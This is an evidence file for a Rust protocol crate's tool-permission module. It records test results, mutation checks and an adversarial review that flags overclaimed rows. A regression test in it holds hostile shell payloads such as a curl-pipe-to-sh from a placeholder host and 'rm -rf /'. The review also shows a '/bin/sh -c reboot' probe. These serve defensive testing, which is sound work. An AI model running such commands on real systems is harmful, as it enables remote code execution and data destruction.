checks.name: Descriptor completeness
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools descriptor_completeness:: && cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --doc ToolDescriptorParts
checks.output: 7 integration tests plus 5 doc snippets. ToolDescriptor now carries all thirteen components the contract enumerates -- id, capability, input schema, output schema, provenance digest, trust class, side-effect class, approval requirement, sandbox profile, credential audiences, egress, resource budget, platform support and output/artifact contract -- as fields of ToolDescriptorParts with no Default impl, and every one is read back in every_declared_field_is_carried_and_readable. side_effect_and_approval_are_carried_for_every_combination covers all 4x3 class/approval pairs. Unrepresentability is proven by compilation, not assertion: the snippet omitting side_effect was compiled directly with rustc and reported 'error[E0063]: missing field `side_effect` in initializer of `ToolDescriptorParts<'_>`', the one omitting approval reported the same for `approval`, and the paired no_run snippet -- identical text plus the omitted line -- compiles. A fourth pair shows sandbox::ProviderControlEgress rejected in the egress position with error[E0308] while ToolWorkloadEgress compiles, so control-plane reach cannot be given to a tool workload. Mutation-checked: making declare() substitute SideEffectClass::ReadOnly for the supplied class, and making PlatformSupport::new accept an empty list, each fail the module.

checks.name: Grant intersection
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools grant_intersection:: && cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --doc tools
checks.output: 6 tests. ToolsetGrant still exposes intersect() and no other combining operation; the module-level compile_fail for .union() was compiled directly with rustc and reported error[E0599] (no method named `union`), and it is now paired with a no_run snippet whose only difference is the operation name, which compiles. The audit's fixture-breadth finding is closed: GrantScope has all five scopes (tenant, profile, workspace, channel, automation), effective_grant() folds them by intersection, all_five_scopes_intersect_and_none_of_them_widens exercises all five and additionally checks that dropping any single scope can only widen the result, and no_applicable_grant_permits_nothing pins that an empty scope list permits nothing rather than everything. Mutation-checked: replacing the intersect filter with `true` (grant wins) fails three tests in the module.

checks.name: Search authorization
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools search_authorization:: && cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --doc SessionToolset
checks.output: 6 tests plus one doc pair. search_tools takes &[ToolDescriptor], &ToolsetGrant and &str and returns SearchResults by value; an exact query for shell.exec against a grant that omits it returns zero matches and an empty grant matches nothing over a non-empty registry. The describe half of the row is now covered: describe_tool returns Option<&ToolDescriptor> with no error return at all, and describe_answers_the_same_way_for_absent_and_forbidden_tools pins that a forbidden tool and a non-existent tool are indistinguishable (both None). No ToolError variant carries a tool identifier, checked by no_error_category_can_carry_a_tool_identifier. Toolset mutation: SessionToolset::apply takes a ToolsetChange carrying a NestedCause; the compile_fail passing a SearchResults to apply() was compiled directly and reported error[E0308] (mismatched types), paired with a compiling no_run that passes a ToolsetChange. looking_does_not_change_the_session_toolset asserts the whole SessionToolset value is unchanged across a search and describe, and that a durable change is what moves its revision. Mutation-checked: dropping the grant filter from search_tools, dropping it from describe_tool, and making apply() not advance the revision each fail the module.

checks.name: Workflow bounds
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools workflow_bounds:: && cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --doc WorkflowCapability
checks.output: 7 tests plus 6 doc snippets. All five budgets are now fixed by construction: WorkflowBudget = CallBudget + ResourceBudget{WallClockBudget, CpuBudget, MemoryBudget, OutputBudget}, each a distinct non-zero bounded newtype, so a missing or zero budget is unrepresentable and a transposed one does not compile (the ResourceBudget pair reports error[E0308], its no_run partner compiles). every_declared_budget_is_fixed_and_charged runs one case per budget and checks both the named refusal and that nothing is charged; budgets_accumulate_across_calls pins that wall clock accrues across calls. The module accounts against costs a caller declares -- it reads no clock and measures nothing, which the type documentation states. Compile-fail coverage for escape is now five cases, each compiled directly with rustc: invoke_workflow (recursion and self-invocation), delegate, mcp_call, approve and request_privilege all report error[E0599] 'no method named ... found for struct WorkflowCapability', paired with a no_run snippet of identical setup calling invoke(). Value-level closure as well: WorkflowInvocable::eligible refuses any PrivilegedRequest tool and any of the five RESERVED_CAPABILITIES (workflow.execute, delegation.spawn, mcp.raw, approval.decide, privilege.broker), so no WorkflowSpec value can contain one. Mutation-checked: removing each of the four resource checks, removing the call ceiling, charging a refused call, and dropping either half of the eligibility test each fail the module (7 mutations).

checks.name: Nested causation
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools nested_causation::
checks.output: 5 tests in a module that did not previously exist. NestedCause carries identity::Actor, RunId and CausationId as constructor arguments plus the parent step, so a cause missing any of the three is unrepresentable. WorkflowCapability::invoke(tool, CausationId, NestedCallCost) derives the call's cause from the workflow's own cause -- the caller supplies only the new step -- so a nested call cannot be attributed to another principal or run and cannot lose its causation. NestedCallReceipt carries the cause and the tool's ApprovalRequirement and carries no grant, capability or approval decision, so a call cannot bootstrap authority: a_nested_call_remains_subject_to_ordinary_approval checks a PerInvocation and a PerSession tool. sibling_calls_share_a_parent_and_differ_by_step and a_cause_chain_keeps_its_principal_across_depth pin the chain shape at depth two. Mutation-checked: dropping the parent link, re-parenting a call onto a fresh RunId, and replacing the receipt's approval with ApprovalRequirement::None each fail the module.

checks.name: MCP boundaries
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools mcp_boundaries:: && cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --doc ExportItem
checks.output: 7 tests plus 6 doc snippets in a module that did not previously exist. McpClientDescriptor carries transport (LocalStdio | RemoteStreamableHttp), trust boundary (AttestedChildSandbox | ReviewedHttpsIdentity), a non-zero bounded DiscoveryTimeout, an McpToolFilter whose only constructors are none() and exactly() (no wildcard import) and an explicit McpCredentialMapping. Sampling is off by construction rather than by default value: McpClientParts has no sampling field, declare() always produces McpSampling::Disabled, and enabling it requires the separate with_sampling(SamplingGrant). SamplingGrant refuses ApprovalRequirement::None and carries a ResourceBudget and an approval and nothing else -- no actor, credential or grant -- so it cannot inherit user authority. Export: ExportItem has exactly three shapes (Tool, Resource, Prompt); snippets naming RawStore, HiddenReasoning, Credential, UnrestrictedArtifact and BrokerInput were each compiled directly with rustc and reported error[E0599] 'no variant or associated item named ... found for enum ExportItem', paired with a compiling ExportItem::Tool snippet, and ResourceExport requires an ArtifactRetention so an unrestricted artifact has no shape either. Every shape carries a CapabilityId, so ExportItem::capability() is total and McpServerExport::capability_filtered filters tools, resources and prompts alike; there is no export that escapes the filter by having no capability to check, and an empty grant exports nothing. Mutation-checked: removing the export capability filter, accepting a sampling grant with no approval, reporting Disabled as enabled, and accepting a zero discovery timeout each fail the module.

checks.name: Manifest completeness
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools manifest_completeness:: && cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --doc ExtensionContribution
checks.output: 6 tests plus one doc pair. ExtensionManifestParts now names all seventeen declared fields -- name, contribution (type, entry point and contributions), protocol range, schema range, required sandbox, file grants, network, credential audiences, resources, licence, publisher, provenance, content address, signature, update channel, configuration schema and migration behavior -- with no Default impl, and every one is read back. The audit's second finding is closed by construction rather than by a runtime check: the contribution is a sum type, ExtensionContribution::Backend(BackendContribution) holds capabilities and ExtensionContribution::UserInterface(SurfaceContribution) has no field that could hold one. The compile_fail passing capabilities alongside a UI surface was compiled directly with rustc and reported 'error[E0061]: this enum variant takes 1 argument but 2 arguments were supplied', paired with a compiling Backend snippet. That compile_fail is itself mutation-checked: giving UserInterface a Vec<CapabilityId> field makes the snippet compile and rustdoc then reports 'Test compiled successfully, but it is marked compile_fail'. The previous runtime error variant ToolError::UiExtensionCannotHoldBackendCapability was removed because it became unconstructible; keeping an unreachable error would be evidence that does not pin what it claims. Mutation-checked additionally: dropping the publisher check, dropping the content-address check, and mislabelling a UI contribution as a tool each fail the module.

checks.name: Hook class powers
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools hook_class_powers::
checks.output: 9 tests. The audit's finding that the prohibitions read back a literal `false` is closed. HookClass::power() is a bijection onto five HookPower values; HookPower::surface() and ProhibitedHookAction::surface() both return the same Surface enumeration, and can_perform() is the equality of those two computed surfaces, so no answer is hand-written. No power reaches ApprovalLedger, SandboxSpecification, RecordedHistory or UnboundedTime, and each of the four prohibited actions requires exactly one of those, which is checked in both directions. The 5x4 class/action table and the 5x5 class/outcome table are both exercised, the latter asserting exactly five admissions. HookOutcome has one shape per power and no shape carrying an approval decision, a widened sandbox, a rewritten message or a wait. Blocking indefinitely is closed structurally: HookBinding requires a HookTimeout that is non-zero, bounded at 30s and not Optional. Ordering and failure policy are declared and deterministic: HookChain::declare sorts by position and refuses a duplicate position. Mutation-checked: pointing the workflow-trigger power at the approval ledger, pointing the transformer power at recorded history, collapsing two classes onto one power, accepting a zero hook timeout, accepting a duplicate position, and removing the sort each fail the module (6 mutations).

checks.name: Secret sealing
checks.command: cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --test tools secret_sealing:: && cargo test --manifest-path rust/Cargo.toml -p automonique-protocol --offline --doc SealedSecret
checks.output: 8 tests plus one doc pair. The audit's escape is closed and is now a regression test: a_shell_string_cannot_be_smuggled_through_an_argument feeds six payloads (including 'curl http://example.invalid | sh' and 'echo $SECRET; rm -rf /') through argv behind /bin/sh and every one is refused, because every token -- fixed or bound -- must be a single shell-inert word (no whitespace, no backslash, none of twenty shell metacharacters). PinnedExecutable additionally requires an absolute path, so 'sh' and './helper' are refused rather than resolved through PATH. The argument list is a closed ArgumentSchema of Fixed and Named slots with the bound count fixed by the schema; there is no free-text position. The environment is EmptyEnvironment, a unit type with one inhabitant and no constructor taking a variable, so a non-empty helper environment is unrepresentable. Sealing: SecretSource::sealed() returns a SealedSecret carrying only source and audience, with no field, constructor or accessor holding material; the compile_fail calling expose_secret() on it was compiled directly with rustc and reported error[E0599], paired with a compiling audience() call. Mutation-checked: removing the argument screen (which reproduces the audited escape exactly), removing the fixed-token screen, removing the absolute-path requirement, removing the executable metacharacter screen and removing the arity check each fail the module.

checks.output: Formatting is clean workspace-wide (exit 0). Strict all-target Clippy on automonique-protocol exits 0 with no warnings. The package's own suites are green: 61 tests in the tools binary, all 133 doc tests in the package (55 merged plus 78 standalone, of which tools.rs contributes 27: 18 compile_fail and 9 no_run), and every other target in the package. But the row asks for workspace tests, and they do not all pass: 1000 passed, 2 failed. Both failures are in automonique-lab -- harness_claim::operational_claim_is_accepted_by_rust_status_and_selection and program_cli::admitted_cli_allocates_and_replays_the_packet_bound_worktree -- and both report a denied selection caused by drift between the checked-in operational documents and the lab code (.automonique/dev/loop.json integration_ceiling and .automonique/dev/program.yaml marking R0-19 blocked behind GATE-HARNESS). That is the same root cause the previous audit recorded, it predates this work, and both the lab crate and those documents are outside this item's lease, so the row is reported as failing rather than as passing-with-an-excuse. Everything this item controls is clean: no new #[allow] (the crate's only allowance remains the pre-existing #[allow(clippy::redundant_closure_call)] at codec.rs:436, which belongs to the codec item), no todo!/unimplemented!/dbg!/unsafe in either owned file, rust/Cargo.toml, rust/crates/automonique-protocol/Cargo.toml and rust/Cargo.lock are unmodified (mtimes predate this session), and every command ran with --offline. review.acceptance: no reviewer examined this item. The implementer wrote the code, wrote the tests, ran the mutation checks and wrote this file; that is self-review, not independent review, and no human read the diff.

notes: Nine of the ten contract rows pass; Quality fails for two automonique-lab tests whose cause is operational-document drift outside this item's lease. Files written: rust/crates/automonique-protocol/src/tools.rs, rust/crates/automonique-protocol/tests/tools.rs and this evidence file, and nothing else. The four rows the previous audit measured as failing for missing structure -- Descriptor completeness, Workflow bounds, Nested causation, MCP boundaries -- were closed by adding the missing types rather than by adding assertions about the old ones; Manifest completeness, Hook class powers and Secret sealing were closed by replacing runtime checks with types that make the state unrepresentable. Three deliberate breaking changes inside the module, all safe because grep confirms no other crate or module in the workspace names any tools:: type: ToolDescriptor::new became ToolDescriptor::declare(ToolDescriptorParts) and ExtensionManifest::new became ExtensionManifest::declare(ExtensionManifestParts), both following the SandboxSpecParts pattern already in sandbox.rs; ExtensionKind was replaced by the ExtensionContribution sum type; and ToolError::UiExtensionCannotHoldBackendCapability was removed because the sum type makes it unconstructible. The test it carried was replaced by a stronger compile_fail plus a structural assertion, not deleted to make something pass. Method: 34 behavioural mutations were applied one at a time to src/tools.rs, each run against the tools test binary and reverted; all 34 were killed, and the file was verified byte-identical afterwards. Separately, all 27 doc snippets in the module were extracted and compiled directly with rustc against the built rlib: every compile_fail fails with the intended error code (E0063 missing field, E0599 missing method or variant, E0308 mismatched type, E0061 wrong argument count) and every paired no_run snippet compiles, so no compile_fail is passing for an unrelated reason. The UI-extension compile_fail was additionally mutation-checked by giving the UserInterface variant a capability field, which makes rustdoc report the snippet as compiling. Limits of this evidence: budgets are accounted against costs a caller declares, because the module measures nothing and reads no clock, so no test here proves a host enforces them; signature verification, content addressing and sandbox admission are described by types and performed by nothing; the five reserved capabilities are a value-level refusal at WorkflowInvocable::eligible, which makes an ineligible WorkflowSpec unrepresentable but is not itself a compile-time property; and no TypeScript fixtures exist under sdk/typescript/packages/protocol/ for tools or extensions, so no cross-language parity is claimed. Measurement caveat: the working tree was not a clean checkout. HEAD was 8457c0e at the start of this session and refs/heads/main read 34c6005 when these measurements were taken, because other sessions committed meanwhile, and sibling modules under rust/crates/automonique-protocol (notably namespace.rs and its test) were being edited concurrently -- one workspace run caught namespace::bidirectional_inventory mid-edit and it passed on the next run. Neither owned file was touched by any other session.

adversarial_review.reviewer: automated adversarial agent, separate session from the implementer
adversarial_review.method: copied the crate, applied behavioural mutations, re-ran the suite to find rows whose tests survive the mutation
adversarial_review.caveat: This review found surviving mutations for rows this file records as "pass". A "pass" here means the row was measured and observed to hold, not that its test would fail if the behaviour were removed. Read the findings before treating any row as closed.
adversarial_review.findings:
## R1-21 adversarial review — verdict

**Method.** Copied the workspace to `/tmp/claude-1025/-home-infra-sj278-automonique/189dce1c-a957-463e-bb89-3fdb77b0d452/scratchpad/mut` (verified byte-identical to the repo before and after; the repo was never written to). Ran 34 behavioural mutations one at a time against `--test tools`; extracted all 27 doc snippets from `src/tools.rs` and compiled each directly with `rustc` against the built rlib; and ran 5 *reverse* mutations that grant the module the forbidden capability, to check each `compile_fail` is load-bearing rather than accidental.

**Baseline reproduced in the repo:** `cargo test -p automonique-protocol --offline --test tools` → 61 passed. In the clone: clippy `--all-targets -D warnings` → 0, `--doc` → 78 passed.

### Nothing is fraudulent, and one row is overstated

No row was closed by deleting or weakening a test, by renaming a concept, or by a suppression. The three breaking changes are genuinely contained — `grep -rn "tools::"` across `rust/` and `sdk/` matches nothing outside the two owned files. The `Quality` row is honestly reported as `fail`. **The `compile_fail` audit is clean**: all 18 fail with the intended error class (E0063 missing field ×2, E0308 mismatched type ×3, E0061 arg count ×1, E0599 missing method/variant ×12), none for a typo or missing import, and all 9 `no_run` partners compile. Reverse mutations confirm they are load-bearing: adding `ToolsetGrant::union`, `WorkflowCapability::invoke_workflow`, `SealedSecret::expose_secret`, `ExportItem::RawStore`, or a `Vec<CapabilityId>` field on `ExtensionContribution::UserInterface` each makes the matching snippet compile.

### Blocking finding — `Workflow bounds` is not closed as claimed

The evidence says *"All five budgets are now fixed by construction… every_declared_budget_is_fixed_and_charged runs one case per budget and checks both the named refusal and that nothing is charged"*. Three surviving mutations show the accumulators are unmeasured:

| Mutation | File:line | Result |
|---|---|---|
| `let cpu = cost.cpu_millis;` (drop accumulation) | `/home/infra-sj278/automonique/rust/crates/automonique-protocol/src/tools.rs:1733` | **SURVIVED**, 61/61 green |
| `let output = cost.output_bytes;` (drop accumulation) | `…/src/tools.rs:1744` | **SURVIVED**, 61/61 green |
| charge `self.spent_cpu_millis = cpu;` on the refusal path | `…/src/tools.rs:1734` | **SURVIVED**, 61/61 green |
| `self.peak_memory_bytes = 0;` | `…/src/tools.rs:1759` | **SURVIVED**, 61/61 green |

Concrete failure the suite cannot see: a capability with `CpuBudget::millis(500)` and `CallBudget::calls(16)` making 16 calls that each declare `cpu_millis = 500` charges 8,000 ms against a 500 ms ceiling and every call is admitted. `budgets_accumulate_across_calls` (`…/tests/tools.rs:527`) pins **wall clock only**; `every_declared_budget_is_fixed_and_charged` (`…/tests/tools.rs:501`) builds a fresh capability per budget, makes exactly one call, and asserts only `calls_made() == 0` — never `spent()`. So "budgets are fixed" is mutation-proven for call count and wall clock; CPU, memory and output are proven only as *per-call* ceilings. The compile-fail escape half of this row is sound.

### Non-blocking findings

1. **`ToolsetChange` is an unconstrained override path.** `ToolsetChange::recorded` (`…/src/tools.rs:1178`) is a public `const fn` taking any `ToolsetGrant`, and `SessionToolset::apply` (`…/src/tools.rs:1250`) replaces the session grant wholesale. `…/tests/tools.rs:421-426` asserts a session opened on `{fs.read}` ending up permitting `fs.write`. The contract says "there is no union, no override and no 'grant wins'". It also says "a toolset change is a durable event", so this may be intended — but as written the module does expose a non-intersecting way to widen a session's effective tools, and a test enshrines it. Worth an explicit ruling.

2. **`HookClass::can_perform` computed-ness is unmeasured.** Replacing `…/src/tools.rs:3125` with a literal `false` leaves 61/61 green — the exact shape the previous audit flagged. The code *is* computed, and the row still holds because `no_hook_power_reaches_a_privileged_surface` (`…/tests/tools.rs:1064`) is mutation-sensitive (pointing `EnqueueDurableAction` at `ApprovalLedger` kills two tests). But the evidence sentence "no answer is hand-written" is not something the suite can detect. Relatedly, collapsing two `ProhibitedHookAction` surfaces onto one (`…/src/tools.rs:3071`) also survives, so "each of the four requires exactly one of those" is not measured either.

3. **Ceiling constants are self-referential.** Every ceiling test is written as `X::millis(X::MAX_MILLIS + 1)`. Raising `HookTimeout::MAX_MILLIS` (`…/src/tools.rs:3244`) from 30 s or `DiscoveryTimeout::MAX_MILLIS` from 120 s to ~49 days leaves 61/61 green. "Blocking indefinitely is unrepresentable" still holds structurally (`NonZeroU32`, not `Option`); "bounded at 30s" is a code-reading claim, not a measured one.

4. **`bounded()` is half-untested.** Removing the 256-byte length check or the control-character check (`…/src/tools.rs:3757` / `:3762`) both survive — no test in the module feeds an over-long or control-character value to any `tools::` constructor.

5. **Doc overclaim in `SecretCommand`** (`…/src/tools.rs:3535-3537`): *"an arbitrary shell command is not representable in the executable position **or** in the argument vector"*. I compiled and ran a probe: `PinnedExecutable::new("/bin/sh")` + `ArgumentSchema[fixed "-c", named "script"]` + `["reboot"]` is accepted and yields `argv() == ["-c", "reboot"]`. Single-word commands *are* representable through argv. The contract's own wording ("an arbitrary shell **string**") is satisfied and the audited multi-token escape is genuinely closed with a six-payload regression test — the doc sentence is simply broader than the code.

6. **Doc overclaim in `HookOutcome::replaced`** (`…/src/tools.rs:3183-3194`): "Replace the output with a schema-validated bounded value." Nothing validates against the schema; `SchemaContract` is an id plus a digest and the module cannot validate. It pins a schema, it does not validate one.

7. **Weak test name, sound property.** `no_error_category_can_carry_a_tool_identifier` (`…/tests/tools.rs:430`) exercises 1 of 9 `ToolError` variants and only asserts one Display string lacks `"shell.exec"`. The property does hold by reading `…/src/tools.rs:154-201`, but the test does not measure it.

8. **Namespace conflation.** `McpServerExport::capability_filtered` (`…/src/tools.rs:2309`) filters `CapabilityId` strings through a `ToolsetGrant` whose constructor validates entries as `"tool_id"` and whose `permits` is documented "Whether a tool is granted". Tool identifiers and capability identifiers share one grant namespace.

### Row-by-row

| Row | Verdict |
|---|---|
| Descriptor completeness | **Closed.** Compile-fails E0063 on the exact omitted field, partner compiles, `ProviderControlEgress` case is E0308 (the method exists at `sandbox.rs:134`, so it is a type mismatch not a missing item). Mutations killed. Residual: finding 4. |
| Grant intersection | **Closed.** grant-wins mutation kills 5 tests; `union` compile_fail reverse-proven. Caveat: finding 1. |
| Search authorization | **Closed.** Dropping the grant filter from `search_tools` kills 4 tests, from `describe_tool` kills 2. Residual: finding 7. |
| Workflow bounds | **Not closed as claimed.** Per-call ceilings and compile-fail escape coverage are real; CPU/memory/output accumulation and "nothing is charged on refusal" are unmeasured (blocking finding above). |
| Nested causation | **Closed.** Dropping the parent link kills 2 tests; forcing `ApprovalRequirement::None` on the receipt kills 1. |
| MCP boundaries | **Closed.** Export filter, sampling-without-approval and tool-filter mutations all killed; five ExportItem compile_fails E0599 and reverse-proven. Residuals: findings 3, 8. |
| Manifest completeness | **Closed.** UI-plus-backend compile_fail is E0061 and reverse-proven (adding the field makes it compile and forces three match sites to change). |
| Hook class powers | **Closed on substance**, but two evidence sentences overstate what is measured (finding 2), and the 30 s ceiling is unpinned (finding 3). |
| Secret sealing | **Closed.** The audited escape is a real regression test; removing the argument screen, the absolute-path requirement, or the arity check each kill tests. Residual: finding 5. |
| Quality | **Honestly reported as `fail`.** I confirm clippy 0, 61 + 78 tests green, no `#[allow]`/`todo!`/`unimplemented!`/`dbg!`/`unsafe` in either owned file, and no cross-crate `tools::` references. I did not re-run the full workspace. |

**Bottom line:** the work is substantially sound and the evidence is unusually candid, but `Workflow bounds` should not stand at `pass` on its current wording — three of the five budgets it claims are "fixed" survive removal of their accumulators with the whole suite green.
